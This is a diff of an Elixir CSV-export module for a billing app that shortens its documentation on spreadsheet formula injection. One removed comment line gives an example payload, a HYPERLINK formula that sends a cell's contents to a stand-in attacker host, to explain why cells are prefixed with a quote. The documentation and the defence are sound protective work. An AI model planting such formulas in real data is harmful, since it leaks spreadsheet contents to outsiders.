@@ -1,14 +1,7 @@
 defmodule QuantumBillingWeb.CSV do
   @moduledoc """
-  Writes CSV cells for the downloads.
-
-  ## Formula injection
-
-  Spreadsheets run a cell that starts with `=`, `+`, `-` or `@` as a formula. A
-  client named `=HYPERLINK("http://evil.example/?"&A1,"Click")` would become a
-  live link in the accountant's copy of the export, or worse, so such cells are
-  prefixed with `'`, which spreadsheets read as "this is text". Plain numbers
-  are left alone, so a negative amount still sums.
+  CSV cells for downloads. Cells starting with `=`, `+`, `-` or `@` are
+  prefixed with `'` to block formula injection; plain numbers are left alone.
   """
 
   @doc "One CSV line, CRLF-terminated."
